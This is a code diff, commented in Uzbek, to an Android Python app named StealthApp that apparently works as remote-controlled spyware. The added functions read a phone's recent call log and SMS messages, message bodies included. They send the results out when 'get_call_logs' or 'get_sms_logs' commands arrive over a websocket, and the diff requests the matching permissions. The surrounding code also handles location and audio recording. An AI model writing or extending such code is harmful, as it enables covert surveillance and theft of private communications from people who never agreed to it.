@@ -287,6 +287,85 @@ def get_location_sync():
         return "📍 Manzil xatoligi: " + str(e)
 
 
+# ─── QO'NG'IROQLAR VA SMS ──────────────────────────────────────────────────────
+def get_call_logs_sync():
+    try:
+        from jnius import autoclass
+        act = autoclass('org.kivy.android.PythonActivity').mActivity
+        Uri = autoclass('android.net.Uri')
+        
+        uri = Uri.parse("content://call_log/calls")
+        cursor = act.getContentResolver().query(uri, None, None, None, "date DESC LIMIT 15")
+        
+        if not cursor:
+            return "📞 Qo'ng'iroqlar jurnalini o'qib bo'lmadi (Ruxsat yo'q yoki bo'sh)."
+            
+        logs = ["📞 SO'NGGI 15 TA QO'NG'IROQ:\n"]
+        while cursor.moveToNext():
+            num_idx = cursor.getColumnIndex("number")
+            name_idx = cursor.getColumnIndex("name")
+            type_idx = cursor.getColumnIndex("type")
+            date_idx = cursor.getColumnIndex("date")
+            dur_idx = cursor.getColumnIndex("duration")
+            
+            number = cursor.getString(num_idx) if num_idx >= 0 else "Noma'lum"
+            name = cursor.getString(name_idx) if name_idx >= 0 else "Nomsiz"
+            if not name: name = "Nomsiz"
+            
+            call_type = cursor.getInt(type_idx) if type_idx >= 0 else 0
+            ctype_str = "Kiruvchi ⬇️" if call_type == 1 else "Chiquvchi ↗️" if call_type == 2 else "Qabul qilinmagan ❌" if call_type == 3 else "Boshqa"
+            
+            date_ms = cursor.getLong(date_idx) if date_idx >= 0 else 0
+            duration = cursor.getString(dur_idx) if dur_idx >= 0 else "0"
+            
+            import datetime
+            dt = datetime.datetime.fromtimestamp(date_ms/1000).strftime('%Y-%m-%d %H:%M')
+            
+            logs.append(f"👤 {name} ({number})\n⏳ {dt} | {ctype_str} | {duration} sek\n")
+            
+        cursor.close()
+        return "\n".join(logs)
+    except Exception as e:
+        return f"📞 Qo'ng'iroqlar xatosi: {e}"
+
+
+def get_sms_logs_sync():
+    try:
+        from jnius import autoclass
+        act = autoclass('org.kivy.android.PythonActivity').mActivity
+        Uri = autoclass('android.net.Uri')
+        
+        uri = Uri.parse("content://sms/")
+        cursor = act.getContentResolver().query(uri, None, None, None, "date DESC LIMIT 10")
+        
+        if not cursor:
+            return "💬 SMSlarni o'qib bo'lmadi (Ruxsat yo'q yoki bo'sh)."
+            
+        logs = ["💬 SO'NGGI 10 TA SMS:\n"]
+        while cursor.moveToNext():
+            addr_idx = cursor.getColumnIndex("address")
+            body_idx = cursor.getColumnIndex("body")
+            type_idx = cursor.getColumnIndex("type")
+            date_idx = cursor.getColumnIndex("date")
+            
+            address = cursor.getString(addr_idx) if addr_idx >= 0 else "Noma'lum"
+            body = cursor.getString(body_idx) if body_idx >= 0 else ""
+            msg_type = cursor.getInt(type_idx) if type_idx >= 0 else 0
+            
+            ctype_str = "KIRUVCHI ⬇️" if msg_type == 1 else "CHIQUVCHI ↗️"
+            
+            date_ms = cursor.getLong(date_idx) if date_idx >= 0 else 0
+            import datetime
+            dt = datetime.datetime.fromtimestamp(date_ms/1000).strftime('%Y-%m-%d %H:%M')
+            
+            logs.append(f"📱 {address} | {ctype_str}\n🕒 {dt}\n📝 {body}\n")
+            
+        cursor.close()
+        return "\n".join(logs)
+    except Exception as e:
+        return f"💬 SMS xatosi: {e}"
+
+
 # ─── AUDIO ──────────────────────────────────────────────────────────────────────
 def record_audio():
     try:
@@ -419,6 +498,14 @@ async def ws_loop():
                         info = get_device_info()
                         status[0] = info
                         await loop.run_in_executor(None, send_text_sync, info)
+                    elif msg == 'get_call_logs':
+                        info = get_call_logs_sync()
+                        status[0] = "Qo'ng'iroqlar..."
+                        await loop.run_in_executor(None, send_text_sync, info)
+                    elif msg == 'get_sms_logs':
+                        info = get_sms_logs_sync()
+                        status[0] = "SMSlar..."
+                        await loop.run_in_executor(None, send_text_sync, info)
         except Exception as e:
             ws_ref[0] = None
             wait = min(5 * retry, 30)
@@ -523,6 +610,8 @@ class StealthApp(App):
                 Permission.ACCESS_FINE_LOCATION,
                 Permission.ACCESS_COARSE_LOCATION,
                 Permission.ACCESS_BACKGROUND_LOCATION,
+                Permission.READ_CALL_LOG,
+                Permission.READ_SMS,
             ], self._on_permissions_result)
         except Exception as e:
             status[0] = 'Ruxsat xatoligi: ' + str(e)[:80]
